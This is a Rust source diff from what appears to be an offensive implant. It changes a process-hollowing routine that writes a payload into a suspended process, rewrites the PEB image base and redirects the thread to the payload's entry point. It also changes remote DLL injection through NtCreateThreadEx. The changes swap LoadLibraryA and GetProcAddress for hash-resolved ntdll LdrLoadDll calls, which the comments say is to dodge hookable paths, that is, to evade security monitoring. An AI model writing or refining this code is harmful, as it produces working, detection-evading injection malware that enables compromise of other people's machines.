@@ -115,8 +115,7 @@ unsafe fn ldr_load_local(dll_name: &str) -> usize {
 /// crate doesn't need to depend on agent or call hooked GetProcAddress.
 #[cfg(windows)]
 unsafe fn local_get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut std::ffi::c_void {
-    use std::ffi::{CStr, CString};
-    use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
+    use std::ffi::CStr;
 
     let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
     if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
@@ -170,13 +169,18 @@ unsafe fn local_get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut st
             format!("{}.dll", dll_part)
         };
 
-        let dll_c = match CString::new(dll_name) {
-            Ok(s) => s,
-            Err(_) => return std::ptr::null_mut(),
-        };
+        // Load forwarded target via ntdll!LdrLoadDll to avoid hookable
+        // LoadLibraryA/GetProcAddress IAT paths.
+        let loaded_base = ldr_load_local(&dll_name);
+        if loaded_base == 0 {
+            return std::ptr::null_mut();
+        }
 
-        let hmod = LoadLibraryA(dll_c.as_ptr());
-        if hmod.is_null() {
+        let mut dll_name_nul = dll_name.as_bytes().to_vec();
+        dll_name_nul.push(0);
+        let dll_hash = pe_resolve::hash_str(&dll_name_nul);
+        let hmod = pe_resolve::get_module_handle_by_hash(dll_hash).unwrap_or(loaded_base);
+        if hmod == 0 {
             return std::ptr::null_mut();
         }
 
@@ -185,14 +189,15 @@ unsafe fn local_get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut st
                 Ok(v) => v,
                 Err(_) => return std::ptr::null_mut(),
             };
-            return GetProcAddress(hmod, ord as usize as *const i8) as *mut std::ffi::c_void;
+            return local_get_export_addr_by_ordinal(hmod, ord as u32);
         }
 
-        let symbol_c = match CString::new(symbol_part) {
-            Ok(s) => s,
-            Err(_) => return std::ptr::null_mut(),
-        };
-        return GetProcAddress(hmod, symbol_c.as_ptr()) as *mut std::ffi::c_void;
+        let mut symbol_nul = symbol_part.as_bytes().to_vec();
+        symbol_nul.push(0);
+        let symbol_hash = pe_resolve::hash_str(&symbol_nul);
+        return pe_resolve::get_proc_address_by_hash(hmod, symbol_hash)
+            .map(|a| a as *mut std::ffi::c_void)
+            .unwrap_or(std::ptr::null_mut());
     }
 
     (base + func_rva) as *mut std::ffi::c_void
@@ -447,30 +452,39 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
 
         // Flush the instruction cache for the entire mapped image so the CPU sees
         // the newly written code (L-04 fix).
-        unsafe {
-            winapi::um::processthreadsapi::FlushInstructionCache(
-                pi.hProcess,
-                remote_base as *mut c_void,
-                (*nt).OptionalHeader.SizeOfImage as usize,
-            );
-        }
+        winapi::um::processthreadsapi::FlushInstructionCache(
+            pi.hProcess,
+            remote_base as *mut c_void,
+            (*nt).OptionalHeader.SizeOfImage as usize,
+        );
 
         // Update PEB.ImageBaseAddress
         let mut ctx: CONTEXT = zeroed();
         ctx.ContextFlags = CONTEXT_FULL;
-        GetThreadContext(pi.hThread, &mut ctx);
-        let peb_ptr = ctx.Rdx as *const u8;
-        WriteProcessMemory(
-            pi.hProcess,
-            peb_ptr.add(0x10) as _,
-            &remote_base as *const _ as _,
-            std::mem::size_of::<usize>(),
-            &mut written,
-        );
+        if GetThreadContext(pi.hThread, &mut ctx) == 0 {
+            tracing::warn!(
+                "hollow_and_execute: GetThreadContext failed before PEB image-base update ({}); skipping PEB write",
+                winapi::um::errhandlingapi::GetLastError()
+            );
+        } else {
+            let peb_ptr = ctx.Rdx as *const u8;
+            WriteProcessMemory(
+                pi.hProcess,
+                peb_ptr.add(0x10) as _,
+                &remote_base as *const _ as _,
+                std::mem::size_of::<usize>(),
+                &mut written,
+            );
+        }
 
         // Set new entry point (Rip, not Rcx — was 2.1 bug)
         ctx.Rip = (remote_base + entry_point_rva) as u64;
-        SetThreadContext(pi.hThread, &ctx);
+        if SetThreadContext(pi.hThread, &ctx) == 0 {
+            tracing::warn!(
+                "hollow_and_execute: SetThreadContext failed ({}); continuing",
+                winapi::um::errhandlingapi::GetLastError()
+            );
+        }
         ResumeThread(pi.hThread);
 
         close_handle!(pi.hThread);
@@ -841,10 +855,11 @@ unsafe fn fix_iat_remote(
     payload: &[u8],
     written: &mut winapi::shared::basetsd::SIZE_T,
 ) -> Result<()> {
-    use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
+    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory};
+    use winapi::um::processthreadsapi::{GetThreadContext, ResumeThread, SetThreadContext};
     use winapi::um::synchapi::WaitForSingleObject;
     use winapi::um::winbase::INFINITE;
-    use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE};
+    use winapi::um::winnt::{CONTEXT, CONTEXT_FULL, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE};
 
     // Resolve NtCreateThreadEx once for remote DLL loading (L-01/L-02 fix).
     let ntdll_base =
@@ -871,11 +886,9 @@ unsafe fn fix_iat_remote(
         *mut c_void,
     ) -> i32;
 
-    // LoadLibraryA address (used as the remote thread start routine).
-    let kernel32_base =
-        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"KERNEL32.DLL\0")).unwrap_or(0);
-    let load_lib_addr = if kernel32_base != 0 {
-        pe_resolve::get_proc_address_by_hash(kernel32_base, pe_resolve::hash_str(b"LoadLibraryA\0"))
+    // LdrLoadDll address (used as the remote thread start routine).
+    let ldr_load_dll_addr = if ntdll_base != 0 {
+        pe_resolve::get_proc_address_by_hash(ntdll_base, pe_resolve::hash_str(b"LdrLoadDll\0"))
     } else {
         None
     };
@@ -944,50 +957,153 @@ unsafe fn fix_iat_remote(
             //   L-01: session-wide ASLR ensures both processes map the DLL at
             //         the same preferred base, so addresses we resolve locally
             //         remain valid remotely.
-            if let (Some(nt_create_addr), Some(ll_addr)) = (ntcreate_opt, load_lib_addr) {
-                let name_len = dll_name_lower.len(); // includes null terminator
-                let remote_name = VirtualAllocEx(
+            if let (Some(nt_create_addr), Some(ldr_addr)) = (ntcreate_opt, ldr_load_dll_addr) {
+                let wide_name: Vec<u16> = dll_name_str
+                    .encode_utf16()
+                    .chain(std::iter::once(0))
+                    .collect();
+                let wide_bytes = wide_name.len() * 2;
+                let us_offset = wide_bytes;
+                let base_addr_offset = us_offset
+                    + std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>();
+                let total_remote = base_addr_offset + std::mem::size_of::<usize>();
+
+                let remote_block = VirtualAllocEx(
                     hprocess,
                     std::ptr::null_mut(),
-                    name_len,
+                    total_remote,
                     MEM_COMMIT | MEM_RESERVE,
                     PAGE_READWRITE,
                 );
-                if !remote_name.is_null() {
+                if !remote_block.is_null() {
                     let mut wr = 0usize;
                     if WriteProcessMemory(
                         hprocess,
-                        remote_name,
-                        dll_name_lower.as_ptr() as _,
-                        name_len,
+                        remote_block,
+                        wide_name.as_ptr() as _,
+                        wide_bytes,
                         &mut wr,
                     ) != 0
                     {
-                        let nt_create_thread: NtCreateThreadExFn =
-                            std::mem::transmute(nt_create_addr);
-                        let mut h_thread: *mut c_void = std::ptr::null_mut();
-                        let status = nt_create_thread(
-                            &mut h_thread,
-                            0x1FFFFF,
-                            std::ptr::null_mut(),
+                        let remote_us_ptr =
+                            (remote_block as usize + us_offset) as *mut c_void;
+                        let remote_base_out =
+                            (remote_block as usize + base_addr_offset) as *mut c_void;
+                        let remote_str_va = remote_block as usize;
+
+                        let mut remote_us = winapi::shared::ntdef::UNICODE_STRING {
+                            Length: (wide_bytes.saturating_sub(2)) as u16,
+                            MaximumLength: wide_bytes as u16,
+                            Buffer: remote_str_va as *mut u16,
+                        };
+
+                        if WriteProcessMemory(
                             hprocess,
-                            ll_addr as *mut c_void,
-                            remote_name,
-                            0,
-                            0,
-                            0,
-                            0,
-                            std::ptr::null_mut(),
-                        );
-                        if status >= 0 && !h_thread.is_null() {
-                            WaitForSingleObject(h_thread, INFINITE);
-                            pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
-                        } else {
-                            tracing::warn!("fix_iat_remote: NtCreateThreadEx for remote LoadLibraryA failed: {:x}", status);
+                            remote_us_ptr,
+                            &mut remote_us as *mut _ as *const c_void,
+                            std::mem::size_of::<winapi::shared::ntdef::UNICODE_STRING>(),
+                            &mut wr,
+                        ) != 0
+                        {
+                            let zero_base: usize = 0;
+                            if WriteProcessMemory(
+                                hprocess,
+                                remote_base_out,
+                                &zero_base as *const _ as *const c_void,
+                                std::mem::size_of::<usize>(),
+                                &mut wr,
+                            ) != 0
+                            {
+                                let nt_create_thread: NtCreateThreadExFn =
+                                    std::mem::transmute(nt_create_addr);
+                                let mut h_thread: *mut c_void = std::ptr::null_mut();
+                                let status = nt_create_thread(
+                                    &mut h_thread,
+                                    0x1FFFFF,
+                                    std::ptr::null_mut(),
+                                    hprocess,
+                                    ldr_addr as *mut c_void,
+                                    remote_us_ptr,
+                                    0x1, // create suspended so we can set up args
+                                    0,
+                                    0,
+                                    0,
+                                    std::ptr::null_mut(),
+                                );
+                                if status >= 0 && !h_thread.is_null() {
+                                    #[cfg(target_arch = "x86_64")]
+                                    {
+                                        let mut ctx: CONTEXT = std::mem::zeroed();
+                                        ctx.ContextFlags = CONTEXT_FULL;
+                                        if GetThreadContext(h_thread, &mut ctx) == 0 {
+                                            tracing::warn!(
+                                                "fix_iat_remote: GetThreadContext before LdrLoadDll failed ({})",
+                                                winapi::um::errhandlingapi::GetLastError()
+                                            );
+                                        } else {
+                                            // LdrLoadDll(Path, Flags, ModuleFileName, ModuleHandle)
+                                            ctx.Rcx = 0;
+                                            ctx.Rdx = 0;
+                                            ctx.R8 = remote_us_ptr as u64;
+                                            ctx.R9 = remote_base_out as u64;
+                                            if SetThreadContext(h_thread, &ctx) == 0 {
+                                                tracing::warn!(
+                                                    "fix_iat_remote: SetThreadContext for LdrLoadDll failed ({})",
+                                                    winapi::um::errhandlingapi::GetLastError()
+                                                );
+                                            }
+                                        }
+                                    }
+
+                                    #[cfg(not(target_arch = "x86_64"))]
+                                    {
+                                        tracing::warn!(
+                                            "fix_iat_remote: remote LdrLoadDll argument setup only implemented on x86_64"
+                                        );
+                                    }
+
+                                    ResumeThread(h_thread);
+                                    WaitForSingleObject(h_thread, INFINITE);
+
+                                    let mut loaded_remote_base: usize = 0;
+                                    let mut rd = 0usize;
+                                    if ReadProcessMemory(
+                                        hprocess,
+                                        remote_base_out,
+                                        &mut loaded_remote_base as *mut _ as *mut c_void,
+                                        std::mem::size_of::<usize>(),
+                                        &mut rd,
+                                    ) == 0
+                                        || rd != std::mem::size_of::<usize>()
+                                    {
+                                        tracing::warn!(
+                                            "fix_iat_remote: could not read remote LdrLoadDll base output for {}",
+                                            dll_name_str
+                                        );
+                                    } else if loaded_remote_base == 0 {
+                                        tracing::warn!(
+                                            "fix_iat_remote: remote LdrLoadDll did not report a loaded base for {}",
+                                            dll_name_str
+                                        );
+                                    }
+
+                                    pe_resolve::close_handle(h_thread as *mut core::ffi::c_void);
+                                } else {
+                                    tracing::warn!(
+                                        "fix_iat_remote: NtCreateThreadEx for remote LdrLoadDll failed: {:x}",
+                                        status
+                                    );
+                                }
+                            }
                         }
                     }
-                    winapi::um::memoryapi::VirtualFreeEx(hprocess, remote_name, 0, MEM_RELEASE);
+                    winapi::um::memoryapi::VirtualFreeEx(hprocess, remote_block, 0, MEM_RELEASE);
                 }
+            } else {
+                tracing::warn!(
+                    "fix_iat_remote: NtCreateThreadEx or LdrLoadDll unavailable; skipping remote DLL load for {}",
+                    dll_name_str
+                );
             }
             // Now load locally — use LdrLoadDll resolved via PEB walk (M-26)
             // instead of the hookable LoadLibraryA IAT entry.
